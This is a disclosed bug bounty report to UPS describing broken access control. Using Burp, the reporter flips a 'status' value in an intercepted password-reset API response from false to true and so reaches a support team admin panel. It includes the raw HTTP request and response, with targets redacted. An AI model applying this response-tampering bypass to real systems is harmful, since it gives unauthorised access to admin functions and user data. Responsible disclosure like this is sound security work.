# Broken access control 

## Report Details
- **Report ID**: 1539426
- **URL**: https://hackerone.com/reports/1539426
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-04-13T05:29:29.116Z
- **Disclosed**: 2022-06-18T16:40:08.872Z

## Reporter
- **Username**: nayefhamouda
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ups

## Vulnerability Information
## Summary:
hello ups team ,,,
I've found broken access control vulnerability in your sites 
It allows me to access the admin panel of the support team, and I can view all requests within the site

vulnerable domains:**█████**
## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. go to **█████████** 
  2. go to **████████████████** ,put any email address and intercept the request
  
```
POST /api/Account/SendTempPassword/?userName=█████████████ HTTP/2
Host: ██████████████████
Cookie: ████████
Content-Length: 0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"
Accept: application/json, text/plain, */*
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: ██████████████████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7


```
  3.On the burp site, intercept the response for this request and change this value to 
Then change the **"status"** value of this request from false to true

##response:

```
HTTP/2 200 OK
Cache-Control: no-cache,no-cache,no-store
Pragma: no-cache,no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: 
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains;preload
X-Frame-Options: DENY
X-Ua-Compatible: IE=Edge
Content-Security-Policy: script-src 'self'; object-src 'self'; frame-ancestors 'none'
Expect-Ct: enforce, max-age=7776000, report-uri='███████████████-Allow-Headers: Accept, Content-Type, Origin
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Date: ██████████████████ ████████████ GMT
Content-Length: 89

{"status":true,"errorMessage":"Username does not exist. Please enter correct Username."}
```

  4. After that, go to this path  **/resetPassword** You will notice that this page has been opened without problems

███████████

Go to user or report and you will notice that it opens normally and you can fully control it

I made a video of the vulnerability that you can watch

##video POC:

███████

## Impact

The attacker can hack the admin control panel and view and modify all reports

## Attachments
No attachments
